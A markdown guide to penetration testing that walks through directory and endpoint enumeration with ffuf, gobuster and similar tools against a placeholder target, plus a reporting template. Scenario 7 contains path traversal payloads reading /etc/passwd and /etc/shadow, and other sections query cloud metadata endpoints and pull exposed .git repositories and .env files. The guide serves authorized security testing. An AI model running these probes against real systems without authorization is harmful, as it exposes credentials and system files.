# Directory Payload List - Practical Examples

## 🎯 Real-World Testing Scenarios

This document provides practical examples of how to use the directory payload lists in real-world security testing scenarios.

---

## Table of Contents

1. [Scenario 1: Unknown Target Assessment](#scenario-1-unknown-target-assessment)
2. [Scenario 2: WordPress Security Audit](#scenario-2-wordpress-security-audit)
3. [Scenario 3: API Discovery](#scenario-3-api-discovery)
4. [Scenario 4: Cloud Application Testing](#scenario-4-cloud-application-testing)
5. [Scenario 5: Backup File Hunting](#scenario-5-backup-file-hunting)
6. [Scenario 6: Admin Panel Discovery](#scenario-6-admin-panel-discovery)
7. [Scenario 7: Path Traversal Testing](#scenario-7-path-traversal-testing)
8. [Scenario 8: Development Environment Discovery](#scenario-8-development-environment-discovery)
9. [Advanced Techniques](#advanced-techniques)
10. [Chaining Multiple Payloads](#chaining-multiple-payloads)

---

## Scenario 1: Unknown Target Assessment

### Objective
You need to assess a web application with no prior knowledge of its technology stack.

### Step-by-Step Approach

**Step 1: Initial Quick Scan**
```bash
# Start with common directories
ffuf -w Intruder/common-directories.txt \
     -u https://target.com/FUZZ \
     -mc all -fc 404 \
     -o initial-scan.json
```

**Step 2: Identify Technology**
```bash
# Check what you found
# If /api/ exists → Has an API
# If /wp-admin/ exists → WordPress
# If /.git/ exists → Version control exposed
# If /admin/ exists → Has admin panel
```

**Step 3: Technology-Specific Scan**
```bash
# Found WordPress? Use CMS list
ffuf -w Intruder/cms-directories.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403 \
     -t 50

# Found API? Use API list
ffuf -w Intruder/api-endpoints.txt \
     -u https://target.com/FUZZ \
     -mc all -fc 404
```

**Step 4: Deep Dive**
```bash
# Look for sensitive files
gobuster dir -u https://target.com \
     -w Intruder/backup-sensitive.txt \
     -x zip,sql,bak,tar.gz \
     -t 30
```

### Expected Results
- Technology stack identified
- Admin interfaces discovered
- API endpoints mapped
- Backup files located
- Attack surface documented

---

## Scenario 2: WordPress Security Audit

### Objective
Comprehensive security assessment of a WordPress site.

### Complete Workflow

**Step 1: WordPress Core Files**
```bash
# Discover WordPress structure
wfuzz -w Intruder/cms-directories.txt \
      --hc 404 \
      https://target.com/FUZZ
```

**Step 2: Plugin Enumeration**
```bash
# Find installed plugins
ffuf -w wordpress-plugins.txt \
     -u https://target.com/wp-content/plugins/FUZZ/ \
     -mc 200,301,403 \
     -recursion -recursion-depth 1
```

**Step 3: Theme Discovery**
```bash
# Identify active theme
ffuf -w wordpress-themes.txt \
     -u https://target.com/wp-content/themes/FUZZ/ \
     -mc 200,301,403
```

**Step 4: Backup & Config Files**
```bash
# Look for exposed backups
gobuster dir -u https://target.com \
     -w Intruder/backup-sensitive.txt \
     -x php,sql,zip,tar.gz,bak \
     -t 40
```

**Step 5: Admin Access Points**
```bash
# Find admin interfaces
curl -I https://target.com/wp-admin/
curl -I https://target.com/wp-login.php
curl -I https://target.com/xmlrpc.php
```

### Key Findings to Document
- WordPress version
- Active plugins and themes
- Exposed configuration files
- Backup files
- Debug interfaces
- User enumeration vectors

---

## Scenario 3: API Discovery

### Objective
Discover and map all API endpoints for testing.

### Complete API Enumeration

**Step 1: Find API Base Path**
```bash
# Discover API location
ffuf -w Intruder/api-endpoints.txt \
     -u https://target.com/FUZZ \
     -mc all -fc 404
```

**Step 2: Version Discovery**
```bash
# Test multiple API versions
for i in {1..10}; do
  curl -s -o /dev/null -w "%{http_code} - /api/v$i\n" \
       https://target.com/api/v$i
done
```

**Step 3: Endpoint Enumeration**
```bash
# Discover endpoints
ffuf -w Intruder/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -mc all -fc 404 \
     -t 50
```

**Step 4: Documentation Discovery**
```bash
# Find API documentation
curl https://target.com/api/docs
curl https://target.com/swagger.json
curl https://target.com/api/swagger-ui
curl https://target.com/graphql
curl https://target.com/api/v1/openapi.json
```

**Step 5: GraphQL Introspection**
```bash
# If GraphQL is found
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name } } }"}'
```

### API Testing Checklist
- [ ] All versions identified
- [ ] Endpoints documented
- [ ] Authentication methods discovered
- [ ] API documentation found
- [ ] Rate limiting tested
- [ ] HTTP methods enumerated

---

## Scenario 4: Cloud Application Testing

### Objective
Test a cloud-hosted application for misconfigurations.

### Cloud-Specific Enumeration

**Step 1: Identify Cloud Provider**
```bash
# Check for cloud-specific paths
ffuf -w Intruder/cloud-platforms.txt \
     -u https://target.com/FUZZ \
     -mc all -fc 404
```

**Step 2: AWS-Specific Tests**
```bash
# S3 bucket discovery
aws s3 ls s3://target-bucket --no-sign-request

# Check for metadata endpoint (SSRF)
curl http://169.254.169.254/latest/meta-data/

# Lambda function discovery
ffuf -w Intruder/cloud-platforms.txt \
     -u https://target.com/FUZZ \
     -H "X-Amz-Function-Name: test"
```

**Step 3: Azure-Specific Tests**
```bash
# Azure blob storage
curl https://target.blob.core.windows.net/?comp=list

# Azure metadata
curl -H "Metadata:true" \
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

**Step 4: GCP-Specific Tests**
```bash
# GCP metadata
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/

# GCS bucket
curl https://storage.googleapis.com/target-bucket
```

### Cloud Security Findings
- Exposed storage buckets
- Metadata endpoints accessible
- Serverless functions enumerated
- Cloud service misconfigurations
- IAM policy issues

---

## Scenario 5: Backup File Hunting

### Objective
Discover exposed backup files and sensitive data.

### Comprehensive Backup Discovery

**Step 1: Direct Backup Files**
```bash
# Search for backup files
gobuster dir -u https://target.com \
     -w Intruder/backup-sensitive.txt \
     -x zip,tar,tar.gz,sql,bak,old \
     -t 50 -b 404
```

**Step 2: Date-Based Backups**
```bash
# Current year backups
for month in {01..12}; do
  curl -I https://target.com/backup_2024_$month.sql
  curl -I https://target.com/db_backup_2024$month.zip
done
```

**Step 3: Common Naming Patterns**
```bash
# Test common patterns
curl -I https://target.com/site_backup.zip
curl -I https://target.com/www.tar.gz
curl -I https://target.com/database.sql
curl -I https://target.com/db_dump.sql
curl -I https://target.com/mysqldump.sql
curl -I https://target.com/backup.tar.gz
```

**Step 4: Editor Backup Files**
```bash
# Look for editor backups
ffuf -w common-files.txt \
     -u https://target.com/FUZZ \
     -e .bak,.old,.swp,.swo,~
```

**Step 5: Git Repository**
```bash
# Check for exposed .git
curl -I https://target.com/.git/config
curl -I https://target.com/.git/HEAD

# If found, download repository
wget -r https://target.com/.git/
git checkout -- .
```

### High-Value Targets
- Database dumps (.sql, .sql.gz)
- Archive files (.zip, .tar.gz, .rar)
- Configuration backups (.bak, .old)
- Version control (.git, .svn)
- Environment files (.env, .env.backup)

---

## Scenario 6: Admin Panel Discovery

### Objective
Locate administrative interfaces for security assessment.

### Admin Panel Hunting

**Step 1: Standard Admin Paths**
```bash
# Use admin panel list
ffuf -w Intruder/admin-panels.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,401,403 \
     -t 50
```

**Step 2: Technology-Specific Admins**
```bash
# CMS admin panels
curl -I https://target.com/wp-admin/        # WordPress
curl -I https://target.com/administrator/   # Joomla
curl -I https://target.com/admin/           # Drupal
curl -I https://target.com/admin.php        # phpMyAdmin
```

**Step 3: Custom Admin Paths**
```bash
# Try variations
ffuf -w <(echo -e "admin\nadministrator\nmanage\ncontrol") \
     -u https://target.com/FUZZ \
     -mc all -fc 404
```

**Step 4: HTTP Authentication**
```bash
# Check for HTTP Basic Auth
curl -I https://target.com/admin/ | grep "WWW-Authenticate"
```

**Step 5: Status Code Analysis**
```bash
# 401 = Auth required (found but need creds)
# 403 = Forbidden (exists but blocked)
# 200 = Direct access (investigate)
# 302 = Redirect (follow it)
```

### Admin Discovery Indicators
- 401/403 status codes
- Login forms
- Authentication redirects
- "Admin" in page title
- Dashboard interfaces

---

## Scenario 7: Path Traversal Testing

### Objective
Test for path traversal vulnerabilities.

### Path Traversal Exploitation

**Step 1: Basic Traversal**
```bash
# Test with encoded payloads
ffuf -w Intruder/special-encoded.txt \
     -u "https://target.com/download?file=FUZZ/etc/passwd" \
     -mc 200 -fs 0
```

**Step 2: Parameter Fuzzing**
```bash
# Fuzz file parameter
wfuzz -w Intruder/special-encoded.txt \
      "https://target.com/read.php?file=FUZZ/etc/passwd"
```

**Step 3: Encoding Variations**
```bash
# Test different encodings
curl "https://target.com/file?path=..%2f..%2f..%2fetc%2fpasswd"
curl "https://target.com/file?path=..%252f..%252f..%252fetc%252fpasswd"
curl "https://target.com/file?path=....//....//....//etc/passwd"
```

**Step 4: OS-Specific Payloads**
```bash
# Linux targets
curl "https://target.com/file?path=../../etc/passwd"
curl "https://target.com/file?path=../../etc/shadow"

# Windows targets
curl "https://target.com/file?path=../../windows/win.ini"
curl "https://target.com/file?path=../../windows/system32/drivers/etc/hosts"
```

**Step 5: Null Byte Injection**
```bash
# Try null byte bypass
curl "https://target.com/file?path=../../etc/passwd%00.jpg"
```

### Success Indicators
- File contents in response
- Different response size
- Error messages revealing paths
- System files exposed

---

## Scenario 8: Development Environment Discovery

### Objective
Find development, staging, and test environments.

### Dev Environment Enumeration

**Step 1: Subdomain Discovery**
```bash
# Find dev subdomains
ffuf -w subdomains.txt \
     -u https://FUZZ.target.com \
     -mc all -fc 404
     
# Common: dev, staging, test, demo, uat, beta
```

**Step 2: Dev Directories**
```bash
# Use dev/test payload list
gobuster dir -u https://target.com \
     -w Intruder/dev-test-directories.txt \
     -t 50 -s "200,301,302,403"
```

**Step 3: Debug Interfaces**
```bash
# Check for debug pages
curl https://target.com/debug
curl https://target.com/phpinfo.php
curl https://target.com/info.php
curl https://target.com/.env
```

**Step 4: Test Data**
```bash
# Look for test resources
curl https://target.com/test/
curl https://target.com/testdata/
curl https://target.com/demo/
```

**Step 5: Source Maps**
```bash
# Check for source maps (dev artifacts)
curl https://target.com/js/app.js.map
curl https://target.com/css/style.css.map
```

### Development Artifacts
- Debug interfaces
- Test accounts
- Source maps
- Verbose error messages
- Unminified code
- Development APIs

---

## Advanced Techniques

### Technique 1: Recursive Discovery
```bash
# Discover and recurse automatically
ffuf -w Intruder/common-directories.txt \
     -u https://target.com/FUZZ \
     -recursion \
     -recursion-depth 3 \
     -mc 200,301,302,403
```

### Technique 2: Multi-Wordlist Attack
```bash
# Combine multiple wordlists
cat Intruder/common-directories.txt \
    Intruder/cms-directories.txt \
    Intruder/api-endpoints.txt | sort -u > combined.txt

ffuf -w combined.txt -u https://target.com/FUZZ
```

### Technique 3: Extension Fuzzing
```bash
# Fuzz directories with extensions
gobuster dir -u https://target.com \
     -w Intruder/common-directories.txt \
     -x php,html,asp,aspx,jsp,do
```

### Technique 4: Case Sensitivity Testing
```bash
# Test case variations (Windows servers)
curl https://target.com/Admin
curl https://target.com/ADMIN
curl https://target.com/admin
curl https://target.com/AdMiN
```

### Technique 5: Rate Limiting Detection
```bash
# Monitor for rate limiting
for i in {1..100}; do
  curl -o /dev/null -s -w "%{http_code}\n" \
       https://target.com/api/endpoint
  sleep 0.1
done
```

---

## Chaining Multiple Payloads

### Example 1: Complete Web App Assessment
```bash
#!/bin/bash
TARGET="https://target.com"

# Phase 1: Initial Discovery
echo "[*] Phase 1: Initial Discovery"
ffuf -w Intruder/common-directories.txt -u $TARGET/FUZZ -mc all -fc 404 -o phase1.json

# Phase 2: Technology Identification
echo "[*] Phase 2: Technology Identification"
ffuf -w Intruder/cms-directories.txt -u $TARGET/FUZZ -mc all -fc 404 -o phase2.json

# Phase 3: API Discovery
echo "[*] Phase 3: API Discovery"
ffuf -w Intruder/api-endpoints.txt -u $TARGET/FUZZ -mc all -fc 404 -o phase3.json

# Phase 4: Backup Hunting
echo "[*] Phase 4: Backup Hunting"
gobuster dir -u $TARGET -w Intruder/backup-sensitive.txt -x zip,sql,bak -o phase4.txt

# Phase 5: Admin Discovery
echo "[*] Phase 5: Admin Discovery"
ffuf -w Intruder/admin-panels.txt -u $TARGET/FUZZ -mc 200,301,302,401,403 -o phase5.json

echo "[*] Assessment Complete!"
```

### Example 2: API Endpoint Mapping
```bash
#!/bin/bash
API_BASE="https://target.com/api"

# Discover API versions
for v in {1..5}; do
  echo "[*] Testing API version $v"
  ffuf -w Intruder/api-endpoints.txt \
       -u $API_BASE/v$v/FUZZ \
       -mc all -fc 404 \
       -o api_v${v}_results.json
done
```

---

## Tools Comparison Examples

### Same Target, Different Tools

**Target**: https://example.com

**With ffuf**:
```bash
ffuf -w Intruder/common-directories.txt \
     -u https://example.com/FUZZ \
     -mc all -fc 404 -t 50 -rate 100
```

**With gobuster**:
```bash
gobuster dir -u https://example.com \
     -w Intruder/common-directories.txt \
     -t 50 -s "200,204,301,302,307,401,403"
```

**With dirsearch**:
```bash
dirsearch -u https://example.com \
     -w Intruder/common-directories.txt \
     -t 50 -e php,html,js
```

**With wfuzz**:
```bash
wfuzz -w Intruder/common-directories.txt \
      --hc 404 \
      https://example.com/FUZZ
```

---

## Reporting Template

### Finding: Exposed Admin Panel

**Severity**: High  
**Tool Used**: ffuf with admin-panels.txt  
**URL**: https://target.com/admin/login.php  
**Method**: GET  
**Status Code**: 200  

**Description**:
An administrative login panel was discovered at /admin/login.php without IP restrictions or additional authentication mechanisms.

**Proof of Concept**:
```bash
ffuf -w Intruder/admin-panels.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,401,403
```

**Impact**:
- Brute force attacks possible
- User enumeration available
- No rate limiting detected

**Recommendation**:
1. Implement IP whitelisting
2. Add multi-factor authentication
3. Implement rate limiting
4. Use non-standard admin path

---

## Best Practices Summary

1. **Start Broad**: Use common-directories.txt first
2. **Identify Technology**: Look for technology indicators
3. **Go Specific**: Use technology-specific wordlists
4. **Deep Dive**: Look for backups, configs, and sensitive files
5. **Document Everything**: Keep detailed notes
6. **Respect Rate Limits**: Don't overwhelm the server
7. **Get Permission**: Always have authorization
8. **Report Responsibly**: Follow disclosure practices

---

**Happy Hunting! Remember to test ethically and legally.** 🎯🔒